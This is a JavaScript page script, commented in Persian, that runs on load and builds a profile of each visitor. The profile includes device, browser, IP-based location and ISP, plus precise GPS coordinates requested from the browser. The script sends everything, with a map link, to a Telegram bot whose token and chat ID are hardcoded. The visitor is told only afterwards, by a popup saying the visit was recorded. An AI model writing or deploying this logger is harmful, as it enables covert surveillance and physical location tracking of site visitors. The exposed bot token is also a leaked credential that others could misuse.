(function() {
    // اطلاعات ربات تلگرام
    const TELEGRAM_BOT_TOKEN = '8287509055:AAEK5XFjVS2D1j2Qx_68v07VGrxzHC5eTRw';
    const TELEGRAM_CHAT_ID = '7646011938';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    // جلوگیری از ارسال تکراری در یک نشست
    if (sessionStorage.getItem('telegramInfoSent')) {
        console.log('اطلاعات قبلاً ارسال شده است');
        return;
    }
    
    // جمع‌آوری اطلاعات قابل دسترسی
    async function collectAndSendInfo() {
        const info = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || 'مستقیم',
            
            // اطلاعات دستگاه و مرورگر
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            
            // اطلاعات صفحه نمایش
            screenWidth: screen.width,
            screenHeight: screen.height,
            screenColorDepth: screen.colorDepth,
            screenPixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            
            // اطلاعات مرورگر
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            online: navigator.onLine,
            javaEnabled: navigator.javaEnabled ? 'فعال' : 'غیرفعال',
            
            // اطلاعات شبکه
            connection: {},
            
            // موقعیت زمانی
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            
            // اطلاعات اضافی
            deviceMemory: navigator.deviceMemory || 'نامشخص',
            hardwareConcurrency: navigator.hardwareConcurrency || 'نامشخص',
            maxTouchPoints: navigator.maxTouchPoints || 0,
            
            // شناسه نشست
            sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
        };
        
        // ذخیره شناسه نشست
        sessionStorage.setItem('visitorSessionId', info.sessionId);
        
        // اطلاعات اتصال شبکه
        if (navigator.connection) {
            info.connection = {
                effectiveType: navigator.connection.effectiveType || 'نامشخص',
                downlink: navigator.connection.downlink || 'نامشخص',
                rtt: navigator.connection.rtt || 'نامشخص',
                saveData: navigator.connection.saveData || false
            };
        }
        
        // تشخیص نوع دستگاه
        info.deviceType = detectDeviceType();
        
        // تشخیص مرورگر
        info.browser = detectBrowser();
        
        // تشخیص سیستم عامل
        info.os = detectOS();
        
        // دریافت موقعیت جغرافیایی (اگر کاربر اجازه دهد)
        try {
            const position = await getGeolocation();
            info.geolocation = position;
        } catch (error) {
            info.geolocation = error;
        }
        
        // دریافت IP کاربر (از طریق سرویس خارجی)
        try {
            const ipInfo = await getIPInfo();
            info.ipInfo = ipInfo;
        } catch (error) {
            info.ipInfo = { error: 'عدم دریافت اطلاعات IP' };
        }
        
        // ارسال به تلگرام
        sendToTelegram(info);
    }
    
    // تشخیص نوع دستگاه
    function detectDeviceType() {
        const ua = navigator.userAgent;
        if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
            return "تبلت";
        } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
            return "موبایل";
        } else {
            return "دسکتاپ";
        }
    }
    
    // تشخیص مرورگر
    function detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.indexOf("Chrome") > -1 && ua.indexOf("Edge") === -1) return "Chrome";
        if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) return "Safari";
        if (ua.indexOf("Firefox") > -1) return "Firefox";
        if (ua.indexOf("Edge") > -1) return "Edge";
        if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
        if (ua.indexOf("Trident") > -1) return "Internet Explorer";
        return "نامشخص";
    }
    
    // تشخیص سیستم عامل
    function detectOS() {
        const ua = navigator.userAgent;
        if (ua.indexOf("Windows") > -1) return "Windows";
        if (ua.indexOf("Mac") > -1) return "macOS";
        if (ua.indexOf("Linux") > -1) return "Linux";
        if (ua.indexOf("Android") > -1) return "Android";
        if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
        return "نامشخص";
    }
    
    // دریافت موقعیت جغرافیایی
    function getGeolocation() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject("مرورگر از موقعیت جغرافیایی پشتیبانی نمی‌کند");
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + " متر",
                        timestamp: new Date(position.timestamp).toLocaleString('fa-IR')
                    });
                },
                (error) => {
                    let message = "خطا در دریافت موقعیت: ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            reject("کاربر اجازه دسترسی نداد");
                            break;
                        case error.POSITION_UNAVAILABLE:
                            reject("موقعیت در دسترس نیست");
                            break;
                        case error.TIMEOUT:
                            reject("زمان درخواست به پایان رسید");
                            break;
                        default:
                            reject("خطای ناشناخته");
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }
    
    // دریافت اطلاعات IP
    async function getIPInfo() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            
            // دریافت اطلاعات بیشتر درباره IP
            const ipInfoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
            const ipInfo = await ipInfoResponse.json();
            
            return {
                ip: data.ip,
                city: ipInfo.city || 'نامشخص',
                region: ipInfo.region || 'نامشخص',
                country: ipInfo.country_name || 'نامشخص',
                isp: ipInfo.org || 'نامشخص'
            };
        } catch (error) {
            // اگر سرویس اول کار نکرد، از سرویس جایگزین استفاده کن
            try {
                const response = await fetch('https://api.db-ip.com/v2/free/self');
                const data = await response.json();
                return {
                    ip: data.ipAddress,
                    city: data.city || 'نامشخص',
                    region: data.stateProv || 'نامشخص',
                    country: data.countryName || 'نامشخص',
                    isp: 'نامشخص'
                };
            } catch (e) {
                return { error: 'عدم دریافت اطلاعات IP' };
            }
        }
    }
    
    // ارسال به تلگرام
    async function sendToTelegram(info) {
        try {
            // ایجاد پیام فرمت شده
            let message = `🚨 *گزارش بازدید جدید* 🚨\n\n`;
            
            message += `📅 *تاریخ:* ${new Date(info.timestamp).toLocaleString('fa-IR')}\n`;
            message += `🌐 *آدرس سایت:* ${info.url}\n`;
            message += `🔗 *ارجاع‌دهنده:* ${info.referrer}\n`;
            message += `🆔 *شناسه نشست:* ${info.sessionId}\n\n`;
            
            message += `📱 *اطلاعات دستگاه:*\n`;
            message += `├ نوع دستگاه: ${info.deviceType}\n`;
            message += `├ سیستم عامل: ${info.os}\n`;
            message += `├ مرورگر: ${info.browser}\n`;
            message += `├ صفحه نمایش: ${info.screenWidth}×${info.screenHeight}\n`;
            message += `├ زبان: ${info.language}\n`;
            message += `└ منطقه زمانی: ${info.timezone}\n\n`;
            
            if (info.ipInfo && !info.ipInfo.error) {
                message += `🌍 *اطلاعات شبکه:*\n`;
                message += `├ IP: ${info.ipInfo.ip}\n`;
                message += `├ شهر: ${info.ipInfo.city}\n`;
                message += `├ منطقه: ${info.ipInfo.region}\n`;
                message += `├ کشور: ${info.ipInfo.country}\n`;
                message += `└ ISP: ${info.ipInfo.isp}\n\n`;
            }
            
            if (info.geolocation && typeof info.geolocation !== 'string') {
                message += `📍 *موقعیت جغرافیایی:*\n`;
                message += `├ عرض جغرافیایی: ${info.geolocation.latitude}\n`;
                message += `├ طول جغرافیایی: ${info.geolocation.longitude}\n`;
                message += `├ دقت: ${info.geolocation.accuracy}\n`;
                message += `└ زمان دریافت: ${info.geolocation.timestamp}\n\n`;
                
                // لینک نقشه
                const mapUrl = `https://maps.google.com/maps?q=${info.geolocation.latitude},${info.geolocation.longitude}`;
                message += `🗺️ *نقشه:* ${mapUrl}\n\n`;
            }
            
            message += `🔧 *جزئیات فنی:*\n`;
            message += `├ User Agent: ${info.userAgent.substring(0, 100)}...\n`;
            message += `├ پردازنده: ${info.hardwareConcurrency} هسته‌ای\n`;
            message += `├ رم: ${info.deviceMemory}GB\n`;
            message += `└ نقطه لمسی: ${info.maxTouchPoints}\n`;
            
            // ارسال درخواست
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            
            const result = await response.json();
            
            if (result.ok) {
                console.log('✅ اطلاعات با موفقیت ارسال شد');
                sessionStorage.setItem('telegramInfoSent', 'true');
                
                // نمایش نوتیفیکیشن به کاربر
                showNotification();
            } else {
                console.error('❌ خطا در ارسال:', result);
            }
        } catch (error) {
            console.error('❌ خطا در ارسال به تلگرام:', error);
        }
    }
    
    // نمایش نوتیفیکیشن به کاربر
    function showNotification() {
        // ایجاد عنصر نوتیفیکیشن
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: #25D366;
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            z-index: 999999;
            font-family: Arial, sans-serif;
            max-width: 300px;
            animation: slideIn 0.3s ease;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="font-size: 24px;">🔔</div>
                <div>
                    <div style="font-weight: bold;">خوش آمدید!</div>
                    <div style="font-size: 12px; opacity: 0.9;">اطلاعات بازدید شما ثبت شد</div>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // حذف خودکار پس از 5 ثانیه
        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 5000);
        
        // اضافه کردن استایل‌های انیمیشن
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    // شروع پس از بارگذاری صفحه
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', collectAndSendInfo);
    } else {
        collectAndSendInfo();
    }
})();

